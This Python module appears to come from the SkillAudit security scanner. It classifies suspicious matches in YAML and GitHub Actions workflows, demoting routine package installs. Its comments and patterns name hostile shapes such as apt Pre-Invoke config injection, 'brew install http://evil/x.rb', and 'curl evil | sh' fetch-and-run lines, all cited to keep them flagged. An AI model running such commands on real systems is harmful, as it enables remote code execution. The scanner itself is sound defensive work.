#!/usr/bin/env python3
"""YAML / GitHub-Actions workflow context classifier for SkillAudit (TRDD-a4260cc6).

Two shapes of YAML are routinely flagged by the matcher:

1. **GitHub Actions workflow files** (``.github/workflows/*.yml``).
   ``jobs.*.steps[*].run`` IS executed shell — the matcher SHOULD scan
   it. But common patterns like ``sudo apt-get install -y X`` are
   legitimate CI hygiene (the runner is an ephemeral VM with sudo
   access by design), not a real privilege-escalation attempt. We
   demote such known-safe install patterns to ``code_fence_neutral``.

2. **Regular YAML / TOML config** (``*.yaml``, ``*.yml``, ``*.toml``).
   Same SAFE_KEY / DANGEROUS_KEY split as JSON — ``description``,
   ``title``, ``keywords`` are documentation; ``command``, ``args``,
   ``script`` are execution.

For YAML / TOML, we route to the same SAFE_KEY allowlist used in
``_skillaudit_json_context``. For workflow files we add the
known-safe-CI-patterns layer on top.

Iron rule: parse failure → ``"unknown"``.
"""

from __future__ import annotations

import re
from typing import Final, Literal

from _skillaudit_json_context import _classify_key  # type: ignore[import-not-found]
from _skillaudit_shell_context import (  # type: ignore[import-not-found]
    _SHELL_EXECUTION_CLASS_RULES,
    _cmdsub_is_safe_data_command,
    _is_shell_comment_line,
    _pipe_to_text_processor,
    _shell_quote_state_at_line_start,
)

ContextVerdict = Literal["safe_literal", "safe_doc", "safe_schema", "code_fence_neutral", "suspect", "unknown"]

# Patterns that are legitimate in CI ``run:`` blocks but trigger
# PRIVILEGE_ESC / CMD_INJECTION. Each entry is matched as a substring
# on the full ``run:`` body. We DEMOTE rather than suppress because the
# user's iron rule says "better safe than sorry — agents triage".
_CI_KNOWN_SAFE_INSTALL_PATTERNS: Final[tuple[re.Pattern[str], ...]] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\bsudo\s+apt(?:-get)?\s+(?:update|install|upgrade)\b",
        r"\bsudo\s+dnf\s+(?:install|upgrade|update)\b",
        r"\bsudo\s+yum\s+(?:install|update)\b",
        r"\bsudo\s+pacman\s+-S\b",
        r"\bsudo\s+apk\s+(?:add|update|upgrade)\b",
        r"\bbrew\s+(?:install|update|upgrade)\b",
        r"\bsudo\s+snap\s+install\b",
        r"\bsudo\s+systemctl\s+(?:restart|reload|start|stop)\b",
        r"\bsudo\s+chmod\s+\+x\b",
        r"\bsudo\s+mkdir\b",
    )
)


def _is_inside_workflow_run(file_path: str) -> bool:
    """True iff path is a GitHub Actions workflow file under ``.github/workflows/``."""
    norm = file_path.replace("\\", "/").lower()
    return "/.github/workflows/" in norm or norm.startswith(".github/workflows/")


_RUN_OPEN_RE: Final[re.Pattern[str]] = re.compile(r"^(?P<indent>\s*)(?:-\s+)?run\s*:\s*(?P<inline>.*)$")
_OTHER_KEY_RE: Final[re.Pattern[str]] = re.compile(
    r"^(?P<indent>\s*)(?:-\s+)?(?!run\s*:|run\s*$)[A-Za-z_][\w-]*\s*:"
)


def _run_block_open_index(lines: list[str], line_idx: int) -> int | None:
    """Index of the ``run:`` line whose block contains ``lines[line_idx]``, or
    None when the line is not inside a run block.

    YAML doesn't carry rich line metadata in our stdlib without an
    extra dep, so we use a simple back-walk: find the nearest preceding
    line that starts with ``- run:`` or ``run:`` (possibly indented).
    If we hit a different YAML key at the same-or-shallower indent
    first, the line is NOT inside a run: block.

    This is approximate but sufficient for the calibration cases.
    """
    target = lines[line_idx]
    target_indent = len(target) - len(target.lstrip())

    for j in range(line_idx, -1, -1):
        line = lines[j]
        m_run = _RUN_OPEN_RE.match(line)
        if m_run:
            indent = len(m_run.group("indent"))
            if indent < target_indent or (j == line_idx):
                # Multi-line block-scalar run: the indent of subsequent
                # lines must be greater than the run: line's indent.
                inline_val = m_run.group("inline").strip()
                if inline_val:
                    # Block-scalar indicators (``|`` ``>`` ``|-`` ``>-``
                    # ``|+`` ``>+``) mean the command body is on the
                    # FOLLOWING lines — those body lines belong to this
                    # run block. Only a GENUINE inline command
                    # (``run: echo hi``) limits the block to its own line.
                    if inline_val in ("|", ">", "|-", ">-", "|+", ">+"):
                        return j
                    return j if j == line_idx else None
                return j
        m_other = _OTHER_KEY_RE.match(line)
        if m_other:
            other_indent = len(m_other.group("indent"))
            if other_indent < target_indent:
                # Hit a shallower YAML key first — we're not in a run.
                return None
    return None


def _line_is_in_run_block(lines: list[str], line_idx: int) -> bool:
    """True iff this line is part of a ``run:`` block value."""
    return _run_block_open_index(lines, line_idx) is not None


def _run_line_is_shell_comment(lines: list[str], line_idx: int) -> bool:
    """True iff this ``run:``-block line is a genuine shell comment.

    A ``run:`` body IS shell, so a ``#`` comment in it is documentation the
    shell never executes — the same reasoning the shell classifier already
    applies to ``.sh`` files. Explaining a shell change in a comment
    naturally means writing markdown-style inline code (``# `| tee` instead
    of `> file`…``), and those backticks were scoring CMD_INJECTION (#180).

    Proof of inertness requires the line to START outside any string: the
    scan runs from the first body line of the enclosing block and only a
    positively ``normal`` state qualifies, so a ``#`` sitting inside a
    double-quoted string opened earlier — where a backtick still runs — is
    never mistaken for a comment.
    """
    if not _is_shell_comment_line(lines[line_idx]):
        return False
    open_idx = _run_block_open_index(lines, line_idx)
    if open_idx is None or open_idx >= line_idx:
        # An inline `run: # …` has no body to lex; treat it as unproven.
        return False
    return _shell_quote_state_at_line_start(lines, open_idx + 1, line_idx) == "normal"


def _has_known_safe_ci_pattern(line: str) -> bool:
    return any(p.search(line) for p in _CI_KNOWN_SAFE_INSTALL_PATTERNS)


# Issue #40 — airtight canonical-install discriminator. A ``run:`` value of
# the shape ``sudo <pkgmgr> install <bare packages>`` (optionally ``&&``-
# chained with MORE pkgmgr commands or benign no-ops) with NO shell
# metacharacter that enables arbitrary execution is a 100%-certain canonical
# CI install — suppress it rather than demote. The moment ANY segment is not a
# recognised-safe command, or any arbitrary-exec metacharacter appears
# (``|`` ``;`` ``$(`` backtick ``>`` ``<``), we fall back to demote.
_SHELL_EXEC_METACHARS_RE: Final[re.Pattern[str]] = re.compile(r"[|;<>`]|\$\(")

# Tokens that turn a metachar-free pkg-install line into arbitrary code execution
# WITHOUT any shell metacharacter, so the metachar guard above misses them
# (audit MAJOR #4):
#   * apt/dnf/yum config-option injection: ``-o APT::Update::Pre-Invoke::=id`` /
#     ``--option DPkg::Pre-Invoke=…`` and ``-c``/``--config-file`` load an apt
#     config that can carry the same Pre-Invoke hooks → root RCE.
#   * a remote URL fed to a package manager (``brew install http://evil/x.rb``,
#     ``dnf install http://…rpm``) executes arbitrary remote code. The ``://``
#     scheme separator is the tell; a legit ``pkg:arch`` / ``pkg=version`` spec
#     never contains it.
# A line carrying any of these is NOT certifiable-airtight → fall back to demote.
_DANGEROUS_INSTALL_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:^|\s)(?:-o|--option|-c|--config-file)\b" r"|://",
    re.IGNORECASE,
)

# audit LOW #144 — ``brew install <local-path>`` executes an arbitrary local
# Ruby formula file (RCE from an attacker-controlled file). The ``brew``
# segment regex below permits ``/`` and ``.`` so a legit tap spec
# (``brew install homebrew/cask/foo``, ``brew install user/tap/formula``)
# stays airtight, but that same allowance lets a path argument
# (``brew install ../../evil``, ``./local.rb``, ``/abs/x.rb``) slip through.
# A tap spec is bare ``<word>/<word>[/<word>]`` identifiers; a local-formula
# PATH carries one of: a leading ``/`` or ``./`` or ``../``, a ``..`` segment
# anywhere, or a ``.rb`` formula extension. Any of those → NOT airtight
# (fall back to demote). Matched per ``brew``-install segment, so a benign
# tap spec on the same chain is unaffected.
_BREW_LOCAL_PATH_RE: Final[re.Pattern[str]] = re.compile(
    r"^brew\s+(?:install|update|upgrade)\b.*?"
    r"(?:(?:^|\s)(?:\.{1,2}/|/)"  # token starting with /  ./  ../
    r"|(?:^|\s|/)\.\.(?:/|\s|$)"  # a bare ``..`` path component
    r"|\.rb\b)",  # a Ruby formula file extension
    re.IGNORECASE,
)
_SAFE_RUN_SEGMENT_RE: Final[tuple[re.Pattern[str], ...]] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"^sudo\s+apt(?:-get)?\s+(?:update|upgrade|install)\b[\w\s.+:=-]*$",
        r"^sudo\s+dnf\s+(?:install|upgrade|update)\b[\w\s.+:=-]*$",
        r"^sudo\s+yum\s+(?:install|update)\b[\w\s.+:=-]*$",
        r"^sudo\s+apk\s+(?:add|update|upgrade)\b[\w\s.+:=-]*$",
        r"^sudo\s+pacman\s+-S(?:yu)?\b[\w\s.+:=-]*$",
        r"^sudo\s+snap\s+install\b[\w\s.+:=-]*$",
        r"^brew\s+(?:install|update|upgrade)\b[\w\s.+:@/-]*$",
        # benign no-ops that legitimately precede installs
        r"^set\s+-[eux]+(?:o\s+pipefail)?$",
        r"^echo\b[\w\s.,:=#'\"-]*$",
        r"^cd\s+[\w./-]+$",
    )
)


def _run_line_is_airtight_pkg_install(line: str) -> bool:
    """True iff the ``run:`` line is purely package-manager install/update
    commands (optionally ``&&``-chained with benign no-ops) and contains no
    arbitrary-exec metacharacter."""
    # Strip a leading ``run:`` / ``- run:`` / list-dash and surrounding quotes.
    body = re.sub(r"^\s*-?\s*(?:run\s*:)?\s*", "", line).strip().strip("'\"").strip()
    if not body:
        return False
    if _SHELL_EXEC_METACHARS_RE.search(body):
        return False
    # Metachar-free but still arbitrary-exec: apt config-option injection
    # (``-o …Pre-Invoke…``) or a remote-URL install (``://``). (audit MAJOR #4)
    if _DANGEROUS_INSTALL_TOKEN_RE.search(body):
        return False
    # A lone ``&`` (background) is also unsafe; only ``&&`` chaining is ok.
    if re.search(r"(?<!&)&(?!&)", body):
        return False
    segments = [s.strip() for s in body.split("&&") if s.strip()]
    if not segments:
        return False
    # audit LOW #144 — reject any ``brew install <local-path>`` segment: it
    # runs an arbitrary local Ruby formula (RCE). Tap specs stay airtight.
    if any(_BREW_LOCAL_PATH_RE.search(seg) for seg in segments):
        return False
    return all(any(p.match(seg) for p in _SAFE_RUN_SEGMENT_RE) for seg in segments)


def _walk_yaml_keys_naive(source: str) -> list[tuple[tuple[str, ...], int]]:
    """Return ``(path, line)`` pairs for every key-line in the YAML.

    Pure-Python regex walker — does NOT need PyYAML. Picks up
    block-style YAML only; flow-style ``{a: 1, b: 2}`` is treated as
    UNKNOWN by the caller.

    Path is the inferred dotted sequence based on indentation. List
    entries (``- item``) are represented as ``"[<n>]"``.

    A ``- key: value`` line is a single-key mapping that is the Nth entry
    of the enclosing list. The mapping's keys live one indentation level
    DEEPER than the ``-`` marker (at the column where the key text starts,
    i.e. ``dash_indent + len("- ")``), so a SIBLING key on a following line
    (which aligns to that key column, with no ``-``) must resolve as a
    sibling of the first key INSIDE the same list entry — not nested under
    it. Tracking the key's own column (not the dash column) as its frame
    level is what makes that happen, and it also lets the next ``- `` at the
    dash column correctly close the entry and increment the list counter
    (audit MEDIUM #59 — previously every sibling key was wrongly nested
    under the first key and the second list entry kept index ``[0]``).
    """
    out: list[tuple[tuple[str, ...], int]] = []
    key_re = re.compile(r"^(?P<indent>[ \t]*)(?P<dash>-\s+)?(?P<key>[A-Za-z_$][\w.$-]*)\s*:")
    stack: list[tuple[int, str]] = []  # (indent_level, key)
    list_counters: dict[int, int] = {}

    for lineno, raw in enumerate(source.split("\n"), 1):
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        m = key_re.match(raw)
        if not m:
            continue
        indent = len(m.group("indent").expandtabs(4))
        dash = bool(m.group("dash"))
        key = m.group("key")
        # The key text starts after the optional ``- `` marker. Its column
        # is the nesting level of the mapping key itself; the list-entry
        # marker (when present) nests one level shallower, at ``indent``.
        key_indent = indent + len(m.group("dash").expandtabs(4)) if dash else indent

        # A new ``- `` entry closes the previous entry at the list level, so
        # pop on the dash column; a bare key pops on its own column.
        pop_level = indent if dash else key_indent
        while stack and stack[-1][0] >= pop_level:
            stack.pop()

        # Reset any list counter at a level we have just left, EXCEPT the
        # list this very line continues: a sibling ``- `` at ``indent`` must
        # keep the counter alive so the next entry becomes ``[1]``, ``[2]``…
        # (popping the prior ``[n]`` placeholder above must NOT drop it —
        # that was the audit MEDIUM #59 "second entry stuck at [0]" bug).
        keep_level = indent if dash else None
        for level in [lvl for lvl in list_counters if lvl >= pop_level and lvl != keep_level]:
            del list_counters[level]

        if dash:
            count = list_counters.get(indent, 0)
            list_counters[indent] = count + 1
            stack.append((indent, f"[{count}]"))
        stack.append((key_indent, key))

        path = tuple(seg for _, seg in stack)
        out.append((path, lineno))

    return out


def classify(
    file_path: str,
    source: str,
    line_idx: int,
    match: str,
    rule_id: str,
) -> ContextVerdict:
    """Classify a SkillAudit match in a YAML file (workflow or generic).

    See module docstring for the per-context verdict matrix.
    """
    lines = source.split("\n")
    if not (0 <= line_idx < len(lines)):
        return "unknown"

    line = lines[line_idx]

    # GitHub Actions workflow path? Known-safe CI install patterns are
    # demoted (not suppressed) because they ARE executed code, just in
    # an ephemeral CI runner. The user's agents triage these.
    if _is_inside_workflow_run(file_path):
        if _line_is_in_run_block(lines, line_idx):
            # Issue #180 — a shell ``#`` comment inside the run: body is
            # documentation the shell never executes. Execution-class rules
            # only; prose-vector rules (PROMPT_INJECT / INDIRECT_PROMPT_INJECT
            # / A2A_*) are deliberately absent from that set and stay visible,
            # because an agent reading the workflow still sees comment text.
            if rule_id in _SHELL_EXECUTION_CLASS_RULES and _run_line_is_shell_comment(lines, line_idx):
                return "safe_literal"
            # Issue #40 — airtight canonical install (sudo <pkgmgr> install
            # <bare packages>, no arbitrary-exec metacharacters) is a
            # 100%-certain non-threat → suppress.
            if _run_line_is_airtight_pkg_install(line):
                return "safe_literal"
            # r01/r02 FP iter (2026-05-28) — a ``run:`` shell line is shell
            # code; reuse the shell classifier's safe command-substitution
            # logic. ``code=$(curl ... -w '%{http_code}')`` (capture),
            # ``$(ls -d plugins/*/ | wc -l)`` (count), ``$(cat "$CACHE_FILE")``
            # (read) are data queries, not injection. Genuine exec shapes
            # (``curl ... | bash``, ``eval "$(...)"``) stay visible via the
            # guards inside the shell helpers.
            if rule_id == "CMD_INJECTION" and (
                _cmdsub_is_safe_data_command(line, match) or _pipe_to_text_processor(line, match)
            ):
                return "safe_literal"
            if _has_known_safe_ci_pattern(line):
                return "code_fence_neutral"
            # In a run: block but not a known-safe pattern — let the
            # heuristic chain decide.
            return "unknown"
        # audit NIT #13: workflow file but NOT confidently inside a run:
        # block. The JSON-style SAFE_KEY allowlist below was built for
        # plugin.json / package.json METADATA — it is the wrong model for
        # workflow YAML, which is execution config. ``_line_is_in_run_block``
        # is also a heuristic back-walk that can misjudge multi-line
        # ``run: |`` block-scalar boundaries, so a real ``run:`` body line
        # could be mis-bucketed as non-run and then wrongly suppressed as a
        # SAFE_KEY (e.g. ``name: "… curl evil | sh"``). Defer to the
        # heuristic chain instead of suppressing.
        return "unknown"

    # Non-workflow YAML: use the key-path classifier.
    paths = _walk_yaml_keys_naive(source)
    if not paths:
        return "unknown"

    # Find the path whose line is the largest <= our target line.
    best_path: tuple[str, ...] = ()
    best_line = -1
    target_line = line_idx + 1
    for path, lineno in paths:
        if lineno <= target_line and lineno > best_line:
            best_line = lineno
            best_path = path

    if not best_path:
        return "unknown"

    return _classify_key(best_path)
